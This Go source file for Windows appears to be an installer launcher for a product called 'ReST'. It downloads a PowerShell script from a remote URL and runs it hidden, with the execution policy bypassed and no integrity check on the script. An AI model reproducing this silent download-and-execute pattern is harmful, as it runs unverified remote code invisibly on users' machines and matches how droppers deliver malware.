//go:build windows

package main

import (
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"
	"time"
)

// Override at build: -ldflags "-X main.defaultBaseURL=https://olxp.cc/download"
var defaultBaseURL = "https://olxp.cc/download"

const (
	installScript = "install-rest.ps1"
	tempScript    = "ReST-install.ps1"
	logName       = "ReST-launcher.log"
)

func main() {
	logPath := filepath.Join(os.TempDir(), logName)
	base := resolveBaseURL()
	logf(logPath, "start base=%s", base)

	scriptPath := filepath.Join(os.TempDir(), tempScript)
	scriptURL := base + "/" + installScript
	if err := downloadFile(scriptURL, scriptPath); err != nil {
		logf(logPath, "download failed: %v", err)
		os.Exit(1)
	}
	if err := stripUTF8BOM(scriptPath); err != nil {
		logf(logPath, "strip bom failed: %v", err)
		os.Exit(1)
	}

	if err := os.Setenv("RESA_INSTALL_BASE", base); err != nil {
		logf(logPath, "set env failed: %v", err)
		os.Exit(1)
	}

	ps, err := powershellPath()
	if err != nil {
		logf(logPath, "powershell missing: %v", err)
		os.Exit(1)
	}

	cmd := exec.Command(ps,
		"-WindowStyle", "Hidden",
		"-NoProfile",
		"-NonInteractive",
		"-ExecutionPolicy", "Bypass",
		"-File", scriptPath,
		"-Silent",
	)
	cmd.Env = os.Environ()
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

	if err := cmd.Start(); err != nil {
		logf(logPath, "start install failed: %v", err)
		os.Exit(1)
	}
	logf(logPath, "install started pid=%d", cmd.Process.Pid)
}

func resolveBaseURL() string {
	if v := strings.TrimSpace(os.Getenv("RESA_INSTALL_BASE")); v != "" {
		return strings.TrimRight(v, "/")
	}
	return strings.TrimRight(defaultBaseURL, "/")
}

func powershellPath() (string, error) {
	root := os.Getenv("SystemRoot")
	if root == "" {
		root = `C:\Windows`
	}
	ps := filepath.Join(root, "System32", "WindowsPowerShell", "v1.0", "powershell.exe")
	if _, err := os.Stat(ps); err != nil {
		return "", err
	}
	return ps, nil
}

func downloadFile(url, dest string) error {
	client := &http.Client{Timeout: 15 * time.Minute}
	req, err := http.NewRequest(http.MethodGet, url, nil)
	if err != nil {
		return err
	}
	req.Header.Set("User-Agent", "ReST-Launcher/1.0")

	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		return fmt.Errorf("http %d for %s", resp.StatusCode, url)
	}

	tmp := dest + ".part"
	out, err := os.Create(tmp)
	if err != nil {
		return err
	}
	_, copyErr := io.Copy(out, resp.Body)
	closeErr := out.Close()
	if copyErr != nil {
		_ = os.Remove(tmp)
		return copyErr
	}
	if closeErr != nil {
		_ = os.Remove(tmp)
		return closeErr
	}
	_ = os.Remove(dest)
	return os.Rename(tmp, dest)
}

func stripUTF8BOM(path string) error {
	data, err := os.ReadFile(path)
	if err != nil {
		return err
	}
	if len(data) >= 3 && data[0] == 0xEF && data[1] == 0xBB && data[2] == 0xBF {
		data = data[3:]
	}
	return os.WriteFile(path, data, 0o644)
}

func logf(path, format string, args ...any) {
	line := time.Now().Format("2006-01-02 15:04:05") + " " + fmt.Sprintf(format, args...) + "\n"
	f, err := os.OpenFile(path, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0o644)
	if err != nil {
		return
	}
	_, _ = f.WriteString(line)
	_ = f.Close()
}
